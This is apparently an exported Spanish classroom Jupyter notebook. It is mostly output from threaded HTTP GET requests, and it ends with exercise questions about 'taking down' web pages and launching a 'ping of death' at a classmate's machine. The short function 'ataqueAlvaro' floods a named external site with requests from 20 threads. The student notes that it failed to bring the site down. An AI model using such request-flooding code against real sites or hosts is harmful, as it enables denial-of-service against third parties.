# <Response [200]>
# Lanzado el hilo con identificador Thread-2022
# <Response [200]>
# Lanzado el hilo con identificador Thread-2027
# <Response [200]>
# Lanzado el hilo con identificador Thread-2029
# <Response [200]>
# Lanzado el hilo con identificador Thread-2025
# <Response [200]>
# Lanzado el hilo con identificador Thread-2033
# <Response [200]>
# Lanzado el hilo con identificador Thread-2032
# <Response [200]>
# Lanzado el hilo con identificador Thread-2030<Response [200]>
# Lanzado el hilo con identificador Thread-2026
# <Response [200]>
# Lanzado el hilo con identificador Thread-2028
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2031<Response [200]>
# Lanzado el hilo con identificador Thread-2035
# <Response [200]>
# Lanzado el hilo con identificador Thread-2042
#
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-2049
# Thread-2036
# Lanzado el hilo con identificador
# Lanzado el hilo con identificador Thread-2038<Response [200]>
# Lanzado el hilo con identificador Thread-2048<Response [200]>
# Lanzado el hilo con identificador Thread-2043
# <Response [200]>
# Lanzado el hilo con identificador Thread-2034<Response [200]>
# Lanzado el hilo con identificador Thread-2040 <Response [200]>
# Lanzado el hilo con identificador Thread-2047<Response [200]>
# Lanzado el hilo con identificador Thread-2041
#
#
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2045
# Thread-2039
# <Response [200]>
# Lanzado el hilo con identificador
# <Response [200]>
# Lanzado el hilo con identificador Thread-2037
# Thread-2051
# <Response [200]>
# Lanzado el hilo con identificador Thread-2053
# <Response [200]>
# Lanzado el hilo con identificador Thread-2054
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-2044
#
# Lanzado el hilo con identificador Thread-2050
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>Thread-2046
# <Response [200]>
# Lanzado el hilo con identificador Thread-2058
# <Response [200]>
# Lanzado el hilo con identificador Thread-2052
# <Response [200]>
# Lanzado el hilo con identificador
# <Response [200]>
# Lanzado el hilo con identificador Thread-2060
# Lanzado el hilo con identificador Thread-2056
# <Response [200]>
# Lanzado el hilo con identificador Thread-2057
# Thread-2055
# <Response [200]>
# Lanzado el hilo con identificador Thread-2059
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-2064
# Lanzado el hilo con identificador Thread-2061
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-2062
#
# Thread-2063
# <Response [200]>
# Lanzado el hilo con identificador Thread-2065
# <Response [200]>
# Lanzado el hilo con identificador Thread-2066
# <Response [200]>
# Lanzado el hilo con identificador Thread-2069
# <Response [200]>
# Lanzado el hilo con identificador Thread-2067<Response [200]>
# Lanzado el hilo con identificador
# Thread-2068<Response [200]>
# Lanzado el hilo con identificador Thread-2071
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2070
# <Response [200]>
# Lanzado el hilo con identificador Thread-2075
# <Response [200]>
# Lanzado el hilo con identificador Thread-2073
# <Response [200]>
# Lanzado el hilo con identificador Thread-2072
# <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-2074
# Lanzado el hilo con identificador Thread-2076
# <Response [200]>
# Lanzado el hilo con identificador Thread-2080<Response [200]>
# Lanzado el hilo con identificador Thread-2077
# <Response [200]>
# Lanzado el hilo con identificador Thread-2081
# <Response [200]>
# Lanzado el hilo con identificador Thread-2078
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2079
# <Response [200]>
# Lanzado el hilo con identificador Thread-2084
# <Response [200]>
# Lanzado el hilo con identificador Thread-2083<Response [200]>
# Lanzado el hilo con identificador
#  Thread-2082
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-2085
# Thread-2086<Response [200]>
# Lanzado el hilo con identificador Thread-2088<Response [200]>
# Lanzado el hilo con identificador Thread-2087
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2090
# <Response [200]>
# Lanzado el hilo con identificador Thread-2091
# <Response [200]>
# Lanzado el hilo con identificador Thread-2089
# <Response [200]>
# Lanzado el hilo con identificador Thread-2093
# <Response [200]>
# Lanzado el hilo con identificador Thread-2092
# <Response [200]>
# Lanzado el hilo con identificador Thread-2094
# <Response [200]>
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador  Thread-2096
# Thread-2095
# <Response [200]>
# Lanzado el hilo con identificador Thread-2097
# <Response [200]>
# Lanzado el hilo con identificador Thread-2099
# <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Lanzado el hilo con identificador Thread-2098
# Thread-2102
# <Response [200]>
# Lanzado el hilo con identificador Thread-2100
# <Response [200]>
# Lanzado el hilo con identificador Thread-2101
# <Response [200]>
# Lanzado el hilo con identificador Thread-2103
# <Response [200]>
# Lanzado el hilo con identificador Thread-2105
# <Response [200]>
# Lanzado el hilo con identificador Thread-2107
# <Response [200]>
# Lanzado el hilo con identificador Thread-2106
# <Response [200]>
# Lanzado el hilo con identificador Thread-2104
# <Response [200]>
# Lanzado el hilo con identificador Thread-2110
# <Response [200]>
# Lanzado el hilo con identificador Thread-2108
# <Response [200]>
# Lanzado el hilo con identificador Thread-2114
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-2122
# Thread-2123
# <Response [200]>
# Lanzado el hilo con identificador Thread-2124
# <Response [200]><Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-2120
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-2111
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2127
#
#
# Lanzado el hilo con identificador Thread-2109
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-2129
# Thread-2113<Response [200]>
# Lanzado el hilo con identificador Thread-2117Lanzado el hilo con identificador
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-2128<Response [200]>
# Lanzado el hilo con identificador
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-2131<Response [200]>
# Lanzado el hilo con identificador Thread-2125Thread-2133<Response [200]>
# Lanzado el hilo con identificador Thread-2130
# <Response [200]>
# Lanzado el hilo con identificador
# Thread-2112
#
# Thread-2118 <Response [200]>
# Lanzado el hilo con identificador Thread-2138
#
#
# <Response [200]>
# Lanzado el hilo con identificador
# Thread-2132<Response [200]>
# Lanzado el hilo con identificador Thread-2121
# <Response [200]>
# Lanzado el hilo con identificador
# <Response [200]>
# Lanzado el hilo con identificador Thread-2134
# Thread-2115Thread-2126Thread-2116Lanzado el hilo con identificador
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2135
# <Response [200]>
# Lanzado el hilo con identificador Thread-2139
#  <Response [200]>
# Lanzado el hilo con identificador Thread-2137
#
# Thread-2119
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2136<Response [200]>
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-2146
# <Response [200]>
# Lanzado el hilo con identificador Thread-2148
# <Response [200]>
# Lanzado el hilo con identificador Thread-2143<Response [200]>
# Lanzado el hilo con identificador Thread-2141
# <Response [200]>
# Lanzado el hilo con identificador Thread-2151
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2147
# <Response [200]>
# Lanzado el hilo con identificador Thread-2144
#  <Response [200]>
# Lanzado el hilo con identificador Thread-2150
# <Response [200]>
# Lanzado el hilo con identificador Thread-2140
# Thread-2145
# <Response [200]>
# Lanzado el hilo con identificador Thread-2149
# <Response [200]>
# Lanzado el hilo con identificador Thread-2142
# <Response [200]>
# Lanzado el hilo con identificador Thread-2153
# <Response [200]>
# Lanzado el hilo con identificador Thread-2152
# <Response [200]>
# Lanzado el hilo con identificador Thread-2154
# <Response [200]>
# Lanzado el hilo con identificador Thread-2155
# <Response [200]>
# Lanzado el hilo con identificador Thread-2156
# <Response [200]>
# Lanzado el hilo con identificador Thread-2158
# <Response [200]>
# Lanzado el hilo con identificador Thread-2157
# <Response [200]>
# Lanzado el hilo con identificador Thread-2159
# <Response [200]>
# Lanzado el hilo con identificador Thread-2160
# <Response [200]>
# Lanzado el hilo con identificador Thread-2161<Response [200]>
# Lanzado el hilo con identificador Thread-2163
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2164
# <Response [200]>
# Lanzado el hilo con identificador Thread-2162
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-2165
#
# <Response [200]>Lanzado el hilo con identificador Thread-2169
# <Response [200]>
# Lanzado el hilo con identificador Thread-2166
#
# Lanzado el hilo con identificador Thread-2168
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-2167
#
# Lanzado el hilo con identificador Thread-2171
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-2172
#
# Lanzado el hilo con identificador Thread-2170
# <Response [200]>
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-2176<Response [200]>
# Lanzado el hilo con identificador Thread-2174
#
# Thread-2173
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>Thread-2178<Response [200]>
# Lanzado el hilo con identificador
# Thread-2177
#
# Lanzado el hilo con identificador Thread-2175
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-2182
# Thread-2180
# <Response [200]>
# Lanzado el hilo con identificador Thread-2185<Response [200]>
# Lanzado el hilo con identificador Thread-2181
# <Response [200]>
# <Response [200]>
#
# Lanzado el hilo con identificadorLanzado el hilo con identificador  Thread-2183Thread-2179
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2184
# <Response [200]><Response [200]><Response [200]>
# Lanzado el hilo con identificador
#
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-2187
#  Lanzado el hilo con identificadorThread-2189 Thread-2186
#
# Thread-2188
# <Response [200]>
# <Response [200]>Lanzado el hilo con identificador
#  <Response [200]>
# Lanzado el hilo con identificador Thread-2196
# <Response [200]>
# Lanzado el hilo con identificador Thread-2192
# Thread-2190
# <Response [200]>
# Lanzado el hilo con identificador Thread-2194Lanzado el hilo con identificador
# <Response [200]>
# Lanzado el hilo con identificador Thread-2193 <Response [200]>
# Lanzado el hilo con identificador Thread-2197Thread-2191
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2195<Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-2200<Response [200]>
# Lanzado el hilo con identificador Thread-2201
#
#
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-2198
# Thread-2199<Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-2202
#
# Lanzado el hilo con identificador Thread-2203
# <Response [200]>
# Lanzado el hilo con identificador Thread-2205
# <Response [200]>
# Lanzado el hilo con identificador Thread-2206
# <Response [200]>
# Lanzado el hilo con identificador Thread-2208
# <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-2204
# Lanzado el hilo con identificador<Response [200]> <Response [200]>
# Lanzado el hilo con identificador Thread-2211<Response [200]>
# Thread-2207
#
#
# <Response [200]>
# Lanzado el hilo con identificador Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-2209
# Thread-2212Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-2210
#
# Thread-2214Thread-2213
# <Response [200]>
# Lanzado el hilo con identificador Thread-2216
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2217
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-2222Thread-2218<Response [200]>
# Lanzado el hilo con identificador Thread-2215
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador
# Thread-2219Thread-2220
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2221
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-2223Thread-2225
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2227
# <Response [200]>
# Lanzado el hilo con identificador Thread-2224
# <Response [200]>
# Lanzado el hilo con identificador Thread-2228
# <Response [200]>
# Lanzado el hilo con identificador Thread-2230
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-2226
# <Response [200]>
# Lanzado el hilo con identificador Thread-2232
#
# Lanzado el hilo con identificador Thread-2229
# <Response [200]>
# Lanzado el hilo con identificador Thread-2231
# <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-2233Lanzado el hilo con identificador
#  Thread-2234
# <Response [200]>
# Lanzado el hilo con identificador Thread-2238
# <Response [200]>
# Lanzado el hilo con identificador Thread-2237<Response [200]>
# Lanzado el hilo con identificador Thread-2235
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2236
# <Response [200]>
# Lanzado el hilo con identificador Thread-2241<Response [200]>
#
# Lanzado el hilo con identificador Thread-2239
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-2240Thread-2242
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2244
# <Response [200]>
# Lanzado el hilo con identificador Thread-2245
# <Response [200]>
# Lanzado el hilo con identificador Thread-2243

# %% [markdown]
# * 15.- Que paginas logro "tumbar"

# %%
Creo que no hemos utilizados suficientes hilos para tumbar una pagina web

# %% [markdown]
# * 16.- Lance 20 hilos con el ping de la muerte al equipo de su compañero ( a elegir )

# %%
def ataqueAlvaro():
    print(requests.get('https://eburnout.com/'))
    print("Lanzado el hilo con identificador", threading.current_thread().getName())

# %%
num_hilos=int(input("Dígame el número de hilos"))
# Out:
# Dígame el número de hilos 20

# %%
web=input("Dígame a dirección web correctamente formateada")
# Out:
# Dígame a dirección web correctamente formateada ! ping 192.168.1.73

# %%
print('\nAtaque usando,', num_hilos)
# Out:
# Ataque usando, 20

# %%
for i in range(num_hilos):
    threading.Thread(target=ataqueAlvaro).start()
# Out:
# <Response [200]>
# Lanzado el hilo con identificador Thread-2248
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-2258
# <Response [200]>
# Lanzado el hilo con identificador Thread-2247
# <Response [200]>
# Lanzado el hilo con identificador Thread-2262<Response [200]>
# Lanzado el hilo con identificador Thread-2254
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2256<Response [200]>
# Lanzado el hilo con identificador Thread-2257
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-2250
#
# Thread-2255<Response [200]>
# Lanzado el hilo con identificador Thread-2252
# <Response [200]>
# Lanzado el hilo con identificador
# <Response [200]>
# Lanzado el hilo con identificador Thread-2253Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-2249
#
#  <Response [200]>
# Lanzado el hilo con identificador Thread-2261Thread-2259 <Response [200]>
# Lanzado el hilo con identificador Thread-2260
# Thread-2251
#
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-2264
# <Response [200]>
# Lanzado el hilo con identificador Thread-2263<Response [200]>
# Lanzado el hilo con identificador
# Thread-2246<Response [200]>
# Lanzado el hilo con identificador Thread-2265
